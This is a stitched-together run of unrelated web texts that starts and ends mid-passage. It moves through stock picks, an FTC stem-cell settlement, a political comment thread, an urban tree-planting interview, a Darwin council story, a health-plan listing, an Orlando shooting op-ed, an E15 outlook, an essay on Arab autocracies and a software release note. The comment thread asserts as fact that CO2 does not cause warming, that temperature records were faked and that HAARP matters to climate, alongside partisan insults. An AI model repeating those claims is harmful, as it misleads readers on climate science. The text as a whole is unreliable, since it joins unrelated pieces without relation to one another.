And that could be good news for investors. The depressed stock trades at just 10 times trailing earnings as well as forward estimates. It goes for just a fraction of its earnings growth prospects. And when you compare its enterprise value to its ability to generate free cash flow, Smith & Wesson Holding is in the bargain-basement bin. It might be some time before it's elevated out of that holding pen, but the potential long-term returns to be earned from buying it at these levels will be that much greater.

Best Dividend Stocks for 2017
These three top-quality dividend stocks look poised to reward shareholders in 2017.
Neha Chamaria, George Budwell, and Evan Niu, CFA
(Nehams)
Jan 20, 2017 at 10:14AM
With dividend stocks historically outperforming non-dividend payers, adding some high-quality dividend stocks to your portfolio is a great way to set up for what could be a volatile year ahead. By high-quality stocks, we don't mean just high dividend yields, as it's even more important that the dividend is growing and is sustainable at higher levels to keep generating income for you for years to come.
With that in mind, we asked three of our contributors to pick one dividend stock each that they believe can withstand volatility and continue to reward shareholders richly in 2017. Find out why they chose Johnson & Johnson (NYSE: JNJ), Illinois Tool Works (NYSE: ITW), and AT&T (NYSE: T).
Dividend stocks are great to supplement your income. Image Source: Getty Images.
This healthcare company offers a top-flight dividend and strong growth
George Budwell (Johnson & Johnson): Johnson & Johnson is the world's largest healthcare company and a Dividend Aristocrat to boot. Apart from being a leader in the high-growth pharma space and having a strong track record of consistent dividend hikes, J&J is a compelling stock to add to your portfolio this year simply because of all the favorable tailwinds surrounding healthcare stocks as a whole right now.
While it may not sound like the healthcare sector is set to push higher with the repeal of the Affordable Care Act, or Obamacare, well underway and the drug-pricing debate continuing to grab headlines. The facts on the ground say otherwise.
First off, the repeal of Obamacare probably won't have a material impact on the top or bottom lines of major healthcare companies like J&J. After all, it's a poorly kept secret that a person's real-world access to novel medicines -- especially those in the oncology space, where J&J excels -- is generally dependent on the type of coverage he or she carries.
In other words, individuals with incomes at or below the poverty line aren't the driving force behind the ever-growing demand for healthcare services in general and high-priced specialty medicines in particular. So there's little reason to believe that J&J won't continue to benefit from the aging global population that's sparking a steady rise in the consumption of healthcare products and services.
Next up, J&J will clearly benefit from Donald Trump's proposed tax reforms -- especially those aimed at lowering the tax burden on foreign profits. Like most of its peers, J&J has been reluctant to repatriate foreign profits due to the negative impact on its bottom line. If this outstanding tax issue is resolved in favor of global corporations at large, this healthcare giant would then have access to its cash held abroad -- and cash flows -- that could be put to good use domestically to create value for its shareholders.
All in all, J&J's fundamental outlook for 2017 and beyond remains strong -- despite the negative headlines swirling around the pharma industry on a near-daily basis right now.
This industrials dividend just keeps getting better
Neha Chamaria (Illinois Tool Works): Most industrial stocks may have gone ahead of themselves in the past couple of months, but I'm not shying away from picking one of them as my favorite dividend stock for 2017. Illinois Tool Works' dividends have never failed to impress me, and I thik that trend will continue for some time.
The conglomerate increased its dividend by a whopping 18% last year, pushing its compounded average dividend growth rate to 14% since 2012. I'm confident of another dividend hike coming this year, and it could be a big one again. My optimism is based on the company's growth prospects: Illinois Tool Works is guiding for earnings-per-share growth of 9% at midpoint for 2017, and that is without factoring any potential uptick in manufacturing activity under Trump's presidency. The company also intends to convert 100% of its net income into free cash flow.
Even if the situation turns adverse, a nice mix of cyclical and defensive businesses in its portfolio should help Illinois Tool Works sail through. It operates seven segments serving diverse industries: automotive, construction, healthcare, oil and gas, food equipment, electronics, and packaging. The company's efforts to divest several low-profit businesses in recent years have also shored up margins, so much so that management is targeting operating margins above 25% by the end of 2018.
Image source: Illinois Tool Works' Investor Day presentation.
It's hard to find companies with such a clear line of sight. Illinois Tool Works has its growth catalysts and an efficient management that's focused on margins and shareholder returns in place. A dividend yield of 2% may not be much, but when it comes with a sustainable and growing payout, income investors needn't look elsewhere.
Hard to go wrong with Ma Bell
Evan Niu, CFA (AT&T): Defensive utility stocks have long been a hallmark of income investing, thanks to greater resilience to economic downturns that reinforce reliable cash flows -- the same cash flows that fund dividend payouts. At current prices, AT&T shares are yielding 4.8%, a healthy payout by any measure. It's not unheard of for AT&T's dividend yield to reach levels of 5% to 6%, but shares performed quite well in 2016, pushing the yield down in the process. While AT&T's business stopped growing long ago (operating revenue was up a modest 4.6% last quarter), investors don't expect growth these days and are instead satiated with generous dividend payouts.
This year will be quite notable for AT&T for two related reasons: its proposed acquisition of Time Warner (NYSE:TWX.DL) and the way the incoming Trump administration will view the deal. The deal's enterprise value is pegged at $108.7 billion when including Time Warner's net debt, and the acquisition has naturally attracted immense regulatory scrutiny given the competitive implications. AT&T's vision of a vertically integrated telecommunications giant isn't exactly unprecedented; telecommunications companies have been trying to differentiate themselves for years to fend off commoditization and have become increasingly interested in content over the past decade.
President-elect Trump had initially vowed to block the merger if elected, although, as always, it's hard to know if he will actually follow through on that promise, given his inherent and demonstrable unpredictability. However, telecom investors are expecting the incoming administration to be more friendly toward consolidation in general, along with a lighter regulatory environment. After meeting with Trump's transition team, AT&T executives are confident that the deal will be approved by regulators. If the deal goes through, Ma Bell will become a massive powerhouse -- all while maintaining and solidifying its healthy dividend payout.

A California-based physician and the two companies he controls have settled charges of deceptively advertising that “amniotic stem cell therapy” can treat serious diseases, including Parkinson’s disease, autism, macular degeneration, cerebral palsy, multiple sclerosis, and heart attacks.
The settlement prohibits the defendants from making these and other health claims in the future unless the claims are true and supported by competent and reliable scientific evidence. The settlement also imposes a partially suspended $3.31 million judgment and requires the defendants to notify current and former patients about the order within 30 days.
“Clinics must have solid evidence to back up their claims before advertising that stem cell therapy can treat serious medical issues, particularly those affecting children and older adults,” said Andrew Smith, Director of the FTC’s Bureau of Consumer Protection.
What the FTC Did to Protect Consumers
According to the Commission’s complaint, Dr. Bryn Jarald Henderson, D.O. and the two companies he owns and operates, Regenerative Medical Group and Telehealth Medical Group, earned at least $3.31 million offering stem cell therapy between 2014 and 2017. Initial stem cell therapy injections ranged from $9,500 to $15,000, with patients encouraged to undergo multiple treatments. Follow-up “booster” treatments cost between $5,000 and $8,000 each.
The complaint alleges that Dr. Henderson acted as the main spokesman and marketer of both companies, touting – without evidence – that stem cell therapy could treat a wide range of serious diseases including Parkinson’s disease, multiple sclerosis, cerebral palsy, macular degeneration, osteoarthritis, strokes, and chronic kidney disease.
Advertising on the website stemcell.life, the defendants even claimed that the therapy could restore the vision of blind patients, citing the case of a “101 year old Lady once blind for 7 years” who, thanks to stem cell therapy, could see again. The website’s homepage boasted that the therapy could “reverse autism symptoms.”
What the Settlement Means
The proposed order settling the FTC’s charges prohibits the defendants from misrepresenting that any product or service: 1) cures, mitigates, or treats any disease or health condition, including Parkinson’s disease, autism, multiple sclerosis, cerebral palsy, traumatic brain injury, heart disease, macular degeneration, chronic kidney disease, osteoarthritis, and stroke; or 2) is comparable, or better than, conventional medical treatments in treating any health condition, unless such claims are true and can be supported by competent and reliable scientific evidence.
The order also imposes a $3.31 million judgment against the defendants that will be partially suspended after they pay $525,000 to the Commission, which may be used to provide refunds to consumers harmed by the defendants’ allegedly deceptive conduct. The order also requires the defendants to notify all current and former patients of the settlement within 30 days.
The Commission vote authorizing the staff to file the complaint and stipulated final order was 4-0-1, with Commissioner Christine Wilson not participating. The FTC filed the complaint and proposed order in the U.S. District Court for the Central District of California.
NOTE: The Commission files a complaint when it has “reason to believe” that the law has been or is being violated and it appears to the Commission that a proceeding is in the public interest. Stipulated final injunctions/orders have the force of law when approved and signed by the District Court judge.

As a Jackass Party's more than equal virtual political aristocrat among our elite betters, Princess Pelosi is not required to make a~ho hum!~boring bother over what she says all we the little people should do. Such as the citizens of Paris?
The same goes with the carbon footprint laid by his majesty the esteemed inventor of the internet Al Gore, whose name may have been considered before the name Ygor was assigned to Hollywood's hunchback helper for Dr Frankenstein.
I wouldn't be surprised if Princess Pelosi aka the Nutty Nancy who proclaimed, "Let us pass this bill to see what is in it" will also say "Let them eat cake" should she as Speaker of the Swamp manage to take back Trump's stolen "crumbs," you know, those next to nothings that gave employees pay raises, bonuses and money better spent by the Dem-wit elite on the welfare of moochers in exchange for votes.

I want to relate this.
A radical lefty woman was interviewed the other day and asked the same question: how the elite left explain their excessive use of private planes, high energy intensive mansions, several cars, etc..
She loftily and arrogantly educated the reporter and us unwashed: it is not the private citizens that will save the world. Oh no Siree! It is corporations whose cap and trade money is orders of magnitude larger (addition by me) than a meager Al Gore or George Soros would even be able to do.
You see? The affluent left like Hussein or the Clintons are allowed all the careless luxury whereby they add to their "carbon footprint" (another idiotic term) without the slightest concern to man-made global warming. They are exempt. It is the little guy who should pay at the gas station such as Macron envisioned. That is where the money is.
Got it?

Air travel puts more CO2 into the air - true
More CO2 in the air causes global warming - false.
No experiment proves this linkage. There is strong negative evidence such as the failure of millions of radiosonde weather balloons to identify the 'hot-spot' ( an essential outcome of the Greenhouse/CAGW models).
Global warming exists - maybe.
It is likely that temperatures have been increasing (recovering) from after the Little Ice Age (1500 to 1700) and before the industrial revolution started.
Records as well as temperature reconstructions exist. Such records have a N. hemisphere bias, are sparse, and are not or are not correctly adjusted for the urban heat island effect. Worse, well publicized reports used data specifically faked to produce the desired result.
More CO2 is bad -false.
More CO2 is good for plant growth and therefore for all animal life that live from plants - eg humans.
Human exhaled breath has 40,000ppm, experiments have found no proven detriment at 20,000ppm.
The design target for submarines is (?) 20,000ppm, for buildings 1,000ppm.
Too little CO2 is deadly - fact.
At 150ppm and below, all land plants and animals die.
(If you wondered what is behind carbon sequestration).
We are now at about 400 ppm. ppm- parts per million by volume for the above data.
CO2 - Good for Gaia, plants, animals, and even humans.
Vote for more CO2!

I think the point was really about the hypocrisy of Pelosi, but are you trying to create reasons to justify her CO2?
Are you suggesting that anyone is arguing that 400ppm could actually be toxic to life? or that too little CO2 would not be harmful? or that higher CO2 could increase plant growth? Those points are obvious to any intelligent person, but also have no connection to climate.

Using your search engine, look for - 'carbon pollution'.
I use Startpage which does not give the number of instances found, hundreds maybe.
Ditto - 'carbon sequestration'.
When you have contacted those responsible for dishonesty, post up again.
You will deserve a point for consistency if not accuracy.

Its not my job to police the world's dishonesty, not yours either. Its only our job to be honest ourselves. Those 3 points I mentioned (from your first post) are all honest and accurate. I'm not arguing with you. I was just saying that those 3 points do not argue against climate change, they are just noise. And while the noise is taking our attention (like talking about submarine levels of CO2?), laws will be created controlling our futures. The noise plays into the hands of the underlying political agenda. Whereas the original post about hypocrisy cut thru all the noise.

Job: Politician, over paid, too much power, too many of them. Hypocrisy is not an essential qualification as believing in opposing ideas at the same time is easy for the mindless.
Job: One of mine if non-paid is laughing at the CAGW scam.
Job: Policing the world's dishonesty, who would volunteer for extreme social isolation?
Suggestion to slow the "underlying political agenda": Encourage politicians to fly out to climate change conferences, lengthy and in distant locales. For such impotant work, a resulting slowdown in legislation could be tolerated.

Pelosi has always thought of herself as one of the global elite, who in the perfect oligarchy, would help rule the world. She really has no knowledge nor concern really for any climate change. It is a tool to control people, as the UN put it.
Notice they never mention the rold of the sun in climate, likely know nothing about science or the sun. They never mention the experiments with HAARP, now divided between Alask and Pureto Rico, as well as other versions in russia and Europe. Tehy don't want to talk about anything they cannot pretend to control. They know their CO2 story is a scam.

I categorically reject the idea that we must abandon travel and other aspects of an affluent life. We just need to take responsibility for the mess we make. I am thousands for miles from home at the moment; extremists would say I'm responsible for the world's problems. No. We don't need to live a Wendell Berry, Little-House-on-the-Prairie lifestyle to take responsibility for the damage we do to others' property.

So far the only "mess" that is clearly established by the increase in CO2 is a 14% increase in plant growth around the world, expansion of forests and improved crop yields.
If it really is getting warmer, the data is suspect, then it will be a net positive for at least a few degrees. Cold is a killer, during times of cold we have famine and pestilence, during times of warm we generally have more prosperity.
Of course, too much of a good thing is bad, but when has the media ever told you that ANY of it is good?

Seriously CircuitGuy, you are the big advocate of Climate change on this site although you admit you don't really know much about it. At the very least personal experience should tell you that cold is more dangerous than heat.

The "mess" can't be defined by government or bureaucratic UN (or similar) agency. Free the market and make the government "shutdown" wider and permanent. Competition is the fastest way to define and solve problems..

Become an Urban Tree Planter for Arbor Day
Apr 17, 2017	Community Involvement, Garden How-To	No Comment	
Become an urban tree planter for Arbor Day
To celebrate Arbor day, we asked Ben Carlson from Friends of the Urban Forest in San Francisco how you and your neighbors can become urban tree planters.
Why should communities plant more trees in urban areas?
Most everyone enjoys the beauty of trees; they’ve inspired artists and writers for millennia. In cities, where natural environments have largely been paved over, this beauty is more precious. Trees increase neighborhood pride, and property values, too.
Trees produce oxygen and sequester carbon, which at least partly offsets the urban emissions that contribute to global warming. They provide wildlife habitat, which is otherwise scarce in urban environments, and a variety of psychological benefits: views of trees make students more successful, workers more productive, and hospital patients recover faster. Trees reduce stress, making people more likely to choose walking over driving.
The U.S. Environmental Protection Agency and city planners regard trees as part of a city’s ‘green infrastructure’ due to the benefits they provide. For example, by capturing water that might otherwise flow into the storm water or sewer system, they reduce the burden on a city’s water processing system; the captured water can then recharge urban aquifers. Trees also capture airborne particles; research shows that asthma attacks are less common in urban neighborhoods with more trees. By providing shade in summertime, trees counteract what’s known as the ‘urban heat island effect.’ They also absorb traffic noise.
How can people get their neighbors involved?
Talk to them about the benefits trees can bring to a neighborhood. A local urban forestry organization can provide assistance. Friends of the Urban Forest helps San Franciscans become "Neighborhood Organizers" by supplying flyers, talking points, and tips about effective outreach strategies. The first step we recommend is a casual happy hour meeting in the neighborhood. Our planting events always happen on Saturday mornings, and conclude with a potluck lunch.
What’s the best way to choose trees to plant?
This is where it’s useful to have guidance from a professional. We prefer to plant trees that provide the greatest environmental benefits, which usually means the largest species suitable for the site. We created an Urban Tree Species Directory that enables people to filter species by a variety of criteria.
What kind of help can people expect from urban forestry organizations like yours?
When someone wants to get a street tree adjacent to his or her property, we check the site to ensure that a tree can be planted there without interfering with utilities or overly reducing the width of the walkway. We recommend species that are suitable for the site and that meet the preferences of the property owner. We cut and dispose of concrete from the sidewalk, deliver and plant the tree and install the hardware (stakes, cross braces, arbor ties) needed to support and protect it, and visit the tree periodically during the first few years post-planting to assess its health and make any pruning cuts needed to ensure good structure. We charge the property owner a co-payment of $135 for most trees, and we subsidize the balance using grants and donations (the total costs are typically around $500).

FINALLY!! KANYE WEST Back To His Senses… Denounce TRUMP And Partisan POLITICS

ShareTweet
American Rapper, Kanye West who has been heavily criticized for supporting President Donald Trump, has now announced he’s distancing himself from Politics while admitting he has been used to spread messages he doesn’t believe in.
The rapper made the shocking announcement on Twitter on Tuesday, and also revealed that he’s now focusing on being creative.
The announcement comes after the father of three debuted a line of apparel for the “Blexit” campaign that encouraged African-American voters to abandon the Democratic Party.
In one of the tweets today, Kanye denied any real connection to “Blexit” merchandise, saying :”I introduced Candace to the person who made the logo and they didn’t want their name on it so she used mine.”

A Northern Territory mayor has slammed his own council’s decision to ban merchandise bearing the controversial slogan ‘CU in the NT’.
T-shirts, beer stubbies, caps and thongs bearing an allusion to a rude word will banned from being displayed at Darwin’s popular Nightcliff and Mindil Beach markets.
Darwin Lord Mayor Kon Vatskalis actually voted for a motion on Tuesday night to pull the merchandise from public display, following a series of complaints from the public about a particular stall on council-leased land.
A Northern Territory mayor has slammed his own council’s decision to ban merchandise (pictured) bearing the controversial slogan ‘CU in the NT’
T-shirts, beer stubbies and caps bearing an allusion to a rude word will banned from being displayed at Darwin’s popular Nightcliff and Mindil Beach markets
Mr Vatskalis, a former NT Labor minister, did however express misgivings about people being too easily offended.
‘My problem is that we live in a “I find offence society” and there’s always a push to remove things from the public,’ he told Daily Mail Australia on Wednesday.
‘Where do we stop?
‘I’m not going to actively try to find out what’s moral, what’s offensive or what’s not offensive.’
Mr Vatskalis, who has quit the Labor Party, said he personally found the slogan ‘childish’.
‘I find it stupid and other people take offence of it,’ he said.
The ‘CU in the NT’ merchandise had been displayed at Darwin’s popular Mindil Beach markets for the past three years
Darwin’s Lord Mayor added the ‘CU in the NT’ merchandise had been displayed at market stalls for three years and wondered why the public wasn’t more outraged at drug paraphernalia like bongs being sold at the Darwin markets.
Darwin Lord Mayor Kon Vatskalis said people were too easily offended
‘Which I find very extraordinary,’ Mr Vatskalis said.
Greens councillor Robin Knox, whose council ward covers the Nightcliff markets, moved the motion after receiving complaints about children seeing the ‘CU in the NT’ stall.
‘The market stall was next to a children’s playground – it’s a very family friendly market,’ she told Daily Mail Australia.
Councillor Knox also noted the Northern Territory had some of Australia’s highest rates of domestic violence and that the industry’s Advertising Standards Board had in 2017 regarded the allusion to the C-word as ‘denigrating’.

‘It’s a negative word. In common language it is not a joke,’ she said.
‘It’s used in a derogatory manner. It’s a swear word.
‘I’ve had an enormous number of emails and phone calls from men and women.’
A man had also complained to police about the merchandise, on the grounds it was offensive to women.
A council by-law will be enforced banning the market associations at Nightcliff and Mindil Beach from allowing offensive material to be displayed in public.
The council motion narrowly passed seven votes to six, with the Lord Mayor exercising his casting vote in favour of the motion.

Prominence Health Plan* | HSA 1 Premier
HSA 1 Premier is an Obamacare health insurance plan offered by Prominence Health Plan* that is available for individuals and families.
This plan is a HMO, meaning you will have to stay within the insurance company’s network, and will need to see a primary care doctor first and get a referral in order to see a specialist. (Read more about HMOs.)
This plan is a Bronze metal level plan, which generally has a lower monthly cost but higher annual deductible (and co-pay), and provides basic insurance coverage for people who do not spend regularly on health care (i.e., doctors, prescription drugs, etc.).
Deductible amount of $6,000. A deductible is the amount of healthcare costs you will pay on your own each year before the insurance company.
Max out-of-pocket of $6,550, which is the most you will pay in a plan year outside of premiums, out-of-network providers and non-essential health benefits.

Who is this plan for?
This plan with a lower monthly cost is great for healthy individuals and families who rarely, if ever, visit the doctor or use prescription drugs. The very high deductible on this plan means you will pay a significant amount of money of pocket for medical care and prescriptions before your insurance kicks in. The very high out-of-pocket maximum on this plan means you could be faced with a very expensive medical bill if an emergency happens. Plans with this type of provider network tend to have a narrower provider network.
HealthCare.com is a privately-held website for healthcare consumers operating since 2007. We’re not the government marketplace.

Save Your Sympathy. You Are The Problem.
06/20/2016 07:33 pm ET Updated Jun 21, 2017
ORLANDO, FL - JUNE 19: People wait for the start of a memorial service on June 19, 2016 in Orlando, Florida. Thousands of people are expected at the evening event which will feature entertainers, speakers and a candle vigil at sunset. In what is being called the worst mass shooting in American history, Omar Mir Seddique Mateen killed 49 people at the popular gay nightclub early last Sunday. Fifty-three people were wounded in the attack which authorities and community leaders are still trying to come to terms with. (Photo by Spencer Platt/Getty Images)
In the aftermath of the Orlando massacre, Utah Lieutenant Governor Spencer Cox attended a vigil for the victims and gave a speech, which soon went viral, in which he apologized for his past homophobic behavior and thanked the LGBTQ community for being patient with him while he evolved. He later said in an interview with MSNBC's Andrea Mitchell:
"I think it's pretty sad that a speech by a Lieutenant Governor in Utah is getting this much attention just by saying we should love each other. How low is the bar in our country?"
On that much we can all agree. But will Cox now find the courage to speak out against his own administration's lawsuit over Obama's directive to states to allow transgender people to use the restroom that matches their gender identity? Will he explain to Gov. Herbert that the "bathroom bill" in North Carolina demonizes and discriminates against trans people and puts them at risk for violence from cisgender transphobic people who want to harm them? Will he recognize that discriminatory policies demonizing the LGBTQ community are what led to the atrocity in Orlando that took 49 lives and injured dozens more?
Because, here's the thing. We've seen a lot of statements and sympathy tweets from lawmakers offering their "thoughts and prayers" to the families of the victims. But most ignore the fact that the shooting was a hate crime against the LGBTQ community. Instead, they use it as an excuse for more xenophobia, more violence, more hatred.
The massacre in Orlando wasn't an ISIS attack. It wasn't a "radical Islamic terrorist" attack on the American way of life. It was a targeted hate crime against largely black and Latinx LGBTQ people by a violent, mentally unstable American man from Queens with a history of domestic abuse and an assault weapon he should never have been able to purchase.
"We have seen no indication that this was a plot directed from outside the United States and we see no indication that he was part of any kind of network. There is confusion about his motives," said FBI Director James Comey.
Indeed, there is now some strong evidence to support that the shooter was, in addition to being a mentally unbalanced wife-beater, a closeted gay man who took out a lifetime of self-loathing on a club full of innocents.
The thing we need to get straight is that when politicians fail to support equality and instead pass discriminatory legislation or when they refuse to speak out against that discrimination, they are helping to foster the climate in which LGBTQ people are feared, scorned, hated and, ultimately, targeted. And then, when we are tragically reaping what they've sown, they offer their empty thoughts and prayers like so many crocodile tears.
It's time we say: enough.
You cannot, as Rep. Trent Franks did, call marriage equality a threat to the nation's survival and then tweet that your "thoughts and prayers are with all the victims, their families, and first responders in the ‪#Orlando attack."
You cannot, as Sen. Ted Cruz did, call LGBTQ rights leaders "jihadists" out to destroy the Christian way of life, and then tweet this: "Our hearts go out to those killed and wounded last night. Our prayers are with their families, and with all their grieving loved ones."
You cannot, as Sen. Rand Paul did, compare same-sex marriage to bestiality and then tweet that your "thoughts and prayers are with the victims and their families."
You cannot, as Gov. Mike Huckabee did, deny the existence of racism in this country and call marriage equality proponents nazis and then ask people to join you "in praying for the victims of the Orlando attack and their families."
You cannot, as Congressman Steve Russell did, personally sponsor the bill allowing federal contractors to discrimination against LGBTQ people and then tweet this: "There is simply no civilized explanation for the horrific terror act in Orlando, Florida."
You cannot, as Michelle Bachmann did, post a photo of the Orlando skyline with the hashtag "#PrayForOrlando" after you've called for Christians to engage in "spiritual warfare" to combat same-sex marriage and compared LGBTQ people to Satan.
You cannot, as Gov. Phil Bryant of Mississippi did, sign a law that allows businesses to refuse service to LGBTQ people and then ask everyone to join you in "praying for God's peace and comfort for those affected by the horrific act of terror in Orlando.
You cannot as Gov. Pat McCrory of North Carolina did, sign into law the "bathroom bill," criminalizing transgender individuals who use restrooms corresponding with their gender identity, and then tweet this: "Orlando shooting was a tragedy & should never take place in our country. Those who died were innocent victims of an inexcusable act."
You cannot, as Gov. Gary Herbert of Utah did, support that discriminatory "bathroom bill" by suing for the right to discriminate against trans people and then issue a statement saying "our hearts are broken" and "we all stand united in support of our brothers and sisters in Orlando."
No more broken hearts. No more prayers for peace and comfort. No more pseudo-solidarity.
If you do not advocate for full equality for LGBTQ people, you are the problem.
"But wait," you say, "I never advocated for murder or violence. I would never, ever support that."
Dear weeping politicians, it is long past time for you to connect these dots. You cannot, in one moment, marginalize, demonize and cast as "other" a particular group, and then in the next moment, lament the fact that that group is being targeted for a hate crime. If you advocate for inequality--whether because of your religious beliefs, your cultural beliefs, your political aspirations, etc.--you are helping to create a culture that made LGBTQ people an easy mark for a lunatic homophobe with an assault weapon, regardless of whether his homophobia was internalized or externalized.
By failing to speak up against discrimination and hate, you have made the world unsafe for LGBTQ people, fueling their own self-loathing and inciting homophobic rage in others. You are the reason hate crimes against LGBTQ people were up in 2015, and particularly against people of color, transgender people and those who are gender-nonconforming. You are the reason LGBTQ teens are the daily targets of harassment, bullying and violence in schools. And you are the reason they too often choose suicide over the pain of living as a human target.
You. Are. The. Problem.
If you really want to stand in solidarity with the victims, their families and our community a whole, stop vilifying our community by calling us pedophiles and predators. Stop telling people to hate the sin. Stop warning straight people we are out to destroy their marriages, their families and the American way of life.
If you want to pay your respects for the LGBTQ people of color who were slaughtered in Orlando, first try tweeting these words: "This was a hate crime against LGBTQ people of color."
Then start voting for equal rights for LGBTQ people.
Ask your supporters to respect all people equally, regardless of sexual orientation or gender identity.
Actively and vocally discourage anti-LGBTQ bullying, harassment and violence.
State unequivocally that #BlackLivesMatter.
If you really want to make sure this doesn't happen again, you must finally recognize the link between a cultural climate that demonizes LGBTQ people and the attacks against them that inevitably follow.
If you can't do that, please, have some respect for the fallen and say nothing at all.

E15 growth will be slow despite waiver, says ESAI Energy
E15 growth will be slow despite waiver, says ESAI Energy

In its recently published Global Biofuels Outlook, ESAI Energy forecasts only a small increase in US E15 gasoline supply, despite the recent announcement that President Donald Trump instructed the Environmental Protection Agency to begin a rulemaking on allowing E15 to be sold all year round.
Even if the E15 waiver is approved in time for next summer, E15 growth will be limited to 2020, due to investment requirements and consumer preferences.
Only a small percentage of US stations currently offer E15 gasoline. In order for additional fuel retailers to sell E15 gasoline, most will have to make investments in pumps, storage tanks and labelling. The ability to sell E15 gasoline all year round will make this investment more feasible, but it will take time. As such, ESAI Energy estimates that E15 demand is likely to grow by less than 60 000 bpd by 2020. With it likely replacing E10 volumes, only 5% of that small volume will replace motor gasoline blending components with ethanol, limiting its near-term impact on both petroleum-based gasoline and ethanol.
Chris Barber, Head of Refining and Biofuels at ESAI Energy, said: “E15 will have a limited impact on petroleum-based gasoline demand in the near term. The required investments in storage, pumps, and misfuelling mitigation will slow the number of new fueling stations offering E15 in the near term. Only about 1400 of the more than 106 000 stations nationwide currently sell E15.”

Order Prevails in the Arab World
By
Gilbert Achcar
Through butchery and sectarianism, the autocracies of the Arab world have survived this round. But in the long run, any order dependent on murder and bloodshed is doomed to collapse.

The beginning of this new year in the Arab region looks remarkably like that of past year. 2018 started with social turmoil and protests in Morocco, Tunisia, Jordan, and Sudan — even Iran seemed to catch up with the Arab upheaval. One year later, in this beginning of 2019, the social earthquake is still shaking an Arab region characterized by its high density of volcanoes, whether active exploding ones or dormant ones ready to erupt at any time.
Tunisia, the epicenter of the big earthquake that started on December 17, 2010 in the town of Sidi Bouzid in the country’s impoverished center — the country that inaugurated the Arab Spring, the most exhilarating chapter of Arab modern history (until the next “spring”) — is still going through one explosion after another. The most recent local uprising erupted in the town of Kasserine, in the country’s same impoverished central region, and extended to other areas in the vicinity of the two major cities of Tunis and Sfax.
In Sudan, whose people joined the 2011 Arab Spring early on and were met by harsh repression from Omar al-Bashir’s despotic regime, the popular movement has gone back on the offensive again and again, relentlessly. Like a tempestuous sea whose gigantic waves are knocking at the walls of a huge prison, the people’s movement is gathering momentum, strike after strike, until the day when the Sudanese Bastille will crumble — a day that will come inexorably despite all the efforts deployed by the Sudanese despot’s “brothers” among the Gulf monarchs to rescue him.
The Arab Old Regime is now coming together again, and the region’s counterrevolutionary forces are reuniting, overcoming the religious sectarian divisions that they exploited for a while in striving to push the Arab Spring off its course towards democracy and social equality into the filthy swamp of sectarian hatreds. How telling that the man who first reembraced Bashar al-Assad — the Syrian symbol of the despotic order that held out against the sweeping revolutionary wave that began in Tunisia eight years ago — is none other than the head of what is presently the weakest link of the chain of Arab regimes: Omar al-Bashir himself, who made a surprise visit to Damascus by the end of last year.
How telling likewise that one of the regimes leading the way in bringing the Syrian government back into the stinking fold of Arab despotic regimes — the fold from which Damascus was excluded temporarily, paradoxically due to the convergence of its own effort with that of its “brothers” in sinking the Syrian revolution in the murky waters of sectarianism — is none other than Bahrain’s monarchy, the Syrian regime’s counterrevolutionary lookalike. Both regimes, in Damascus and Manama, exploited sectarianism in consolidating their power, even though the elite’s sect in one is the majority’s sect in the other and vice-versa. Both the Syrian and the Bahraini regimes were rescued from the Arab uprising by foreign intervention, even though the latter was salvaged by the Saudi monarchy whereas the former was rescued by Iran’s “mullarchy,” the Saudis’ sworn enemy, later joined by neo-tsarist Russia.
The Arab regimes are now busy restoring their broken links and preparing an Arab Summit of reconciliation. They are breathing deeply, trying to persuade themselves that the Arab revolution is dead and things are back to the normal repressive order. In so doing, they remind us of the eloquent words that the great revolutionary leader and thinker Rosa Luxemburg wrote at a time when Europe’s reactionary regimes were breathing deeply, reassured by the failure of the revolutionary wave that had swept the continent in the aftermath of the First World War. On January 14, 1919, the day before she was assassinated in Berlin by counterrevolutionary thugs a century ago, Rosa wrote those eloquent words: “‘Order prevails in Warsaw!’ ‘Order prevails in Paris!’ ‘Order prevails in Berlin!’ Every half-century that is what the bulletins from the guardians of ‘order’ proclaim from one center of the world-historic struggle to the next.”
It is as if we are hearing today the echo of these jubilant bulletins from the guardians of Arab “order”: “Order prevails in Manama!” “Order prevails in Damascus!” “Order prevails in Cairo!” And here comes Rosa’s biting comment: “And the jubilant ‘victors’ fail to notice that any ‘order’ that needs to be regularly maintained through bloody slaughter heads inexorably toward its historic destiny; its own demise.” The Arab rulers likewise do not realize that their despotic “order” that needs to be maintained in permanence by way of murder and slaughter is doomed to collapse.
However hard they try to persuade themselves that their despotic “order” is back to normal, they won’t be able to shut out the revolutionary din arising from Tunisia and Sudan today, Cairo and Damascus tomorrow. For what started in Tunisia eight years ago is indeed a long-term revolutionary process that won’t stop while the Arab Old Regime is still standing up. In Tunisia or Sudan today, and in all the region’s countries potentially, “the revolution is still in the square!” as the young Egyptian rebels used to chant before they were forced into temporary silence by brutal repression — until the next explosion that will come inevitably.

Bill Gates In Washington To Promote Polio Eradication Plan, Discuss Other Health-Related Agendas
May 09, 2013
Facebook Twitter LinkedIn Email Print
Bill Gates, co-chair of the Bill & Melinda Gates Foundation, was in Washington this week “promoting his plan to combine a 1960s-era oral vaccine with new satellite photography and GPS trackers to eradicate polio finally from the globe,” Politico reports. “Gates appeared with former President Bill Clinton at a public forum Tuesday morning and then went behind closed doors to speak to the Senate Republican luncheon,” the news service writes, noting “there were face-to-face meetings [on Tuesday] with senior members of the Senate and House Appropriations committees important to Gates’s health and agriculture agendas.” According to the news service, Gates is “asking Washington to increase its annual commitment to an international polio fund from $100 million to $150 million. That’s a 50 percent increase — post the March sequester.”
“But the payoff could be huge if polio is wiped out, eliminating the need for costly vaccinations in the future,” Politico adds (Rogers, 5/8). “‘Polio is special,’ Gates tells NPR’s Robert Siegel on ‘All Things Considered,'” NPR’s “Shots” blog writes, adding, “Once you [eradicate polio], you save $2 billion a year that will be applied to those other [health] activities. There’s no better deal economically to getting to zero” cases. The blog continues, “Plus, he says, much of the $5.5 billion spent on polio will go toward building up health care systems in the affected countries” (Doucleff, 5/8). According to Politico, while in Washington, “Gates [also] talked up new farming methods and genetically modified seeds as an answer for hunger in Africa, whose staple crops were neglected in earlier research” (5/8).

What’s New and What You Should Know About Dynamics GP 2018 R2
The newest release of Dynamics GP, version 2018 R2, has been released. With each major release it’s important to know what new features and changes are available to decide the important questions. What features may benefit your organization? What changes might impact your day to day business?
Sales Enhancements
For sales, six new enhancements have been added, two of which are new features. Of the new features, the first allows the printing and emailing of sales documents at the same time as a single process which is useful if you frequently do both. The second new feature allows for single click emailing of customer statements from the Customer Maintenance card.
Other enhancements include a new SmartList for deposits associated with unposted sales transactions, additional sort options on Sales Order Process Item Inquiry, and the retention of the Ship-To-Address when changing a customer using the Customer Combiner and Modifier Utility.
Human Resources & Payroll Enhancements
